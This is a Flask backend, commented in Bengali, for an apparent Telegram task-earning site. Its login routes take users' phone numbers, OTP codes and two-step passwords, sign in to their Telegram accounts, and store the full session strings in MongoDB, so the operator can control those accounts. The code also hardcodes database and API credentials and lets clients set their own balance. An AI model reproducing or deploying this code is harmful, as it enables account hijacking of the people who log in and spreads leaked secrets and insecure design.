import os
import asyncio
import nest_asyncio
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

# রেন্ডার বা ক্লাউড সার্ভারের জন্য লুপ ফিক্স
nest_asyncio.apply()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")

# CORS সেটিংস
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# আপনার কনফিগারেশন
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# ডাটাবেস কানেকশন
client_db = MongoClient(MONGO_URI)
db = client_db['aaf_tele_earn_db']
users_col = db['users']
ads_col = db['ads']  # বিজ্ঞাপনের জন্য আলাদা কালেকশন
tasks_col = db['tasks'] # টাস্ক ম্যানেজমেন্টের জন্য

# টেম্পোরারি ক্লায়েন্ট স্টোর
temp_clients = {}

# ---------------- HTML পেজ রাউটস ----------------

@app.route('/')
@app.route('/login')
def login(): 
    return render_template('login.html')

@app.route('/dashboard')
def dashboard(): 
    return render_template('dashboard.html')

@app.route('/task')
def task(): 
    return render_template('task.html')

@app.route('/trading')
def trading(): 
    return render_template('trading.html')

@app.route('/account')
def account(): 
    return render_template('account.html')

@app.route('/wallet')
def wallet(): 
    return render_template('wallet.html')

@app.route('/admin')
def admin_page(): 
    return render_template('admin.html')

# ---------------- ওটিপি পাঠানোর ফাংশন (SYNC) ----------------

@app.route('/api/send_otp', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"success": False, "message": "Phone number missing"})

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
        client.connect()
        
        result = client.send_code_request(phone)
        
        temp_clients[phone] = {
            "client": client,
            "hash": result.phone_code_hash,
            "loop": loop
        }
        
        return jsonify({"success": True, "message": "OTP Sent Successfully!"})
        
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# ---------------- ভেরিফাই ফাংশন (সেশন স্ট্রিং ও ইউনিফাইড ডাটাবেজ সহ) ----------------

@app.route('/api/verify_login', methods=['POST'])
def verify_login():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    two_step = data.get('password')

    if phone not in temp_clients:
        return jsonify({"success": False, "message": "Session expired or phone mismatch"})

    try:
        loop = temp_clients[phone]["loop"]
        asyncio.set_event_loop(loop)
        client = temp_clients[phone]["client"]
        h = temp_clients[phone]["hash"]
        
        # টেলিগ্রামে সাইন ইন
        user = client.sign_in(phone, code, phone_code_hash=h, password=two_step)
        
        # স্ট্রিং সেশন জেনারেট (ইউজার কন্ট্রোল করার জন্য চাবি)
        session_str = client.session.save()
        
        # ডাটাবেজের জন্য ইউজারের তথ্য গোছানো
        user_info = {
            "telegram_id": user.id,
            "phone": phone,
            "name": f"{user.first_name or ''} {user.last_name or ''}",
            "username": user.username,
            "session_string": session_str, # নতুন লগইনে পুরনো সেশন অটো আপডেট হবে
            "last_login": datetime.utcnow()
        }
        
        # MongoDB আপডেট (পুরনো ইউজার হলে আপডেট, নতুন হলে ইনসার্ট)
        users_col.update_one(
            {"telegram_id": user.id},
            {
                "$set": user_info,
                "$setOnInsert": {
                    "main_balance": 0.00,
                    "joined_at": datetime.utcnow(),
                    "status": "active"
                }
            },
            upsert=True
        )
        
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id, "message": "Login Successful!"})
        
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# ---------------- ইউজার প্রোফাইল ডাটা এপিআই ----------------

@app.route('/api/get_user_info')
def get_user_info():
    uid = session.get('uid')
    if not uid:
        return jsonify({"success": False, "message": "Not logged in"})
    
    user = users_col.find_one({"telegram_id": uid})
    if user:
        return jsonify({
            "success": True,
            "user": {
                "id": user['telegram_id'],
                "name": user['name'],
                "phone": user['phone'],
                "balance": user.get('main_balance', 0),
                "username": user.get('username', 'N/A')
            }
        })
    return jsonify({"success": False, "message": "User not found"})

# ---------------- ব্যালেন্স আপডেট এপিআই (টাস্ক ইনকাম) ----------------

@app.route('/api/add_balance', methods=['POST'])
def add_balance():
    uid = session.get('uid')
    if not uid:
        return jsonify({"success": False, "message": "Login required"})
    
    data = request.json
    amount = float(data.get('amount', 0))
    
    try:
        users_col.update_one(
            {"telegram_id": uid},
            {"$inc": {"main_balance": amount}}
        )
        return jsonify({"success": True, "new_balance": "Updated"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# ---------------- অ্যাড রোটেশন ও টাস্ক ম্যানেজমেন্ট ----------------

@app.route('/api/get_active_ads')
def get_active_ads():
    # ডাটাবেস থেকে সব একটিভ অ্যাড নিয়ে আসা
    ads = list(ads_col.find({"active": True}, {"_id": 0}))
    return jsonify({"success": True, "ads": ads})

@app.route('/api/get_tasks')
def get_tasks():
    # ইউজারের জন্য টাস্ক লিস্ট
    tasks = list(tasks_col.find({"status": "active"}, {"_id": 0}))
    return jsonify({"success": True, "tasks": tasks})

# ---------------- সার্ভার রান ----------------

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
